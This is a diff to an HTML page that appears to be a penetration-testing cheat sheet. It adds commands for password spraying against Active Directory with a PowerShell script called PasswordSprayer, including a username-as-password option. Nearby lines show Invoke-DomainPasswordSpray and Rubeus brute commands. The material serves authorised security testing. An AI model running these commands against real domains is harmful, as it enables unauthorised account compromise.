@@ -154,6 +154,12 @@
 <span class="c"># On users subset</span>
 <span class="nb">Invoke-DomainPasswordSpray</span> <span class="n">-UserList</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Domain</span> <span class="n">domain-name</span>  <span class="n">-PasswordList</span> <span class="n">passlist</span><span class="p">.</span><span class="n">txt</span> <span class="n">-OutFile</span> <span class="n">sprayed-creds</span><span class="p">.</span><span class="n">txt</span>
 </code></pre></div>
+<p>Password Spraying with <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/PowerShell/PasswordSprayer.ps1">PasswordSprayer</a>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Password</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
+
+<span class="c"># Use username as password</span>
+<span class="p">.\</span><span class="n">PasswordSprayer</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UsernameAsPassword</span>
+</code></pre></div>
 <p>Rubeus password spraying:</p>
 <div class="highlight"><pre><span></span><code>Rubeus.exe brute /password:Password1 /noticket
 </code></pre></div>
